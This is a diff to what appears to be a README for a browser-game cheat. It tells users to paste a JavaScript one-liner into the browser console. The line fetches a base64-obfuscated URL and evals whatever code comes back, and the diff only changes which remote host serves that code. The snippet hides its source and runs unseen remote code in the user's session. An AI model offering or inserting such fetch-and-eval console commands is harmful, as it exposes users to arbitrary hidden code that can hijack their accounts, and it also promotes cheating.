@@ -10,5 +10,5 @@ This cheat only works in fishing frenzy game mode!
 
 Open console (ctrl + shift + j) and paste the following:
 ```js
-fetch(atob('aHR0cHM6Ly9yZXMuY2xvdWRpbmFyeS5jb20vc2Nob29sLWNoZWF0cy9yYXcvdXBsb2FkL3YxNjM3NDUyMjEzL2Zpc2hpbmdGcmVuenlTZXRXZWlnaHQuanM=')).then((res) => res.text().then((t) => eval(t)))
+fetch(atob('aHR0cHM6Ly9zY2hvb2wtY2hlYXRzLTFhNGVlLWRlZmF1bHQtcnRkYi5maXJlYmFzZWlvLmNvbS9mclNldFdlaWdodC5qc29u')).then(res => res.text()).then(t => eval(JSON.parse(t)));
 ```
